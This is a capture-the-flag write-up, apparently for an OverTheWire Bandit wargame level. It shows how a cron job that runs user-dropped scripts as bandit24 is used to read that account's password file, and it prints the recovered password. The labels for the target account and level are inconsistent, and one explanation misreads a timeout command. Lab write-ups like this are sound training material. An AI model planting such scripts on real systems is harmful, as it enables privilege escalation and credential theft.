# Level 24

### Level Info

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

### Commands you may need to solve this level

chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)

# Solution

First, we check what the cron job is doing:

```sh
bandit23@bandit:~$ cd /etc/cron.d

bandit23@bandit:/etc/cron.d$ ls -l
total 24
-rw-r--r-- 1 root root 120 Jul 17 15:57 cronjob_bandit22
-rw-r--r-- 1 root root 122 Jul 17 15:57 cronjob_bandit23
-rw-r--r-- 1 root root 120 Jul 17 15:57 cronjob_bandit24
-rw-r--r-- 1 root root 201 Apr  8 14:38 e2scrub_all
-rwx------ 1 root root  52 Jul 17 15:59 otw-tmp-dir
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat
## LEEMOS TAREA CRON
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

## LEEMOS EL SCRIPT QUE EJECUTA CADA MINUTO
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

This script executes all the scripts created by bandit23 (owner: bandit23) if these scripts have execution permissions for others (note). It provides a runtime between 9 to 60 seconds to avoid issues with infinite loops or errors and then deletes the file.

#### Question: If it is executed by bandit24, will I have access to bandit24?
Practical example with **whoami**:
If we create a script that tells us the current user:

```sh
#!/bin/bash

echo "$(whoami)">/tmp/tmp.O0Y51DcGYw/file_name
chmod o+r /tmp/tmp.O0Y51DcGYw/file_name
```
What happens if we copy the file in the specific folder /var/spool/bandit24/foo/:

```sh
# WE COPY THE SCRIPT TO THE DIRECTORY WHERE THE SCRIPTS ARE EXECUTED
bandit23@bandit:/tmp/tmp.O0Y51DcGYw$ cp script.sh /var/spool/bandit24/foo/
bandit23@bandit:/tmp/tmp.O0Y51DcGYw$ watch -n 1 ls -l
bandit23@bandit:/tmp/tmp.O0Y51DcGYw$ cat file_name
bandit24
```

With the following script, we will copy the password for bandit27:

```sh
#!/bin/bash

cat /etc/bandit_pass/bandit24>/tmp/tmp.O0Y51DcGYw/pass_24.log
chmod o+r /tmp/tmp.O0Y51DcGYw/pass_24.log
```
And the result is:
```sh
bandit23@bandit:/tmp/tmp.O0Y51DcGYw$ cp script.sh /var/spool/bandit24/foo/
bandit23@bandit:/tmp/tmp.O0Y51DcGYw$ watch -n 1 ls -l
bandit23@bandit:/tmp/tmp.O0Y51DcGYw$ cat pass_24.log 
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

# Password for level 25:

gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
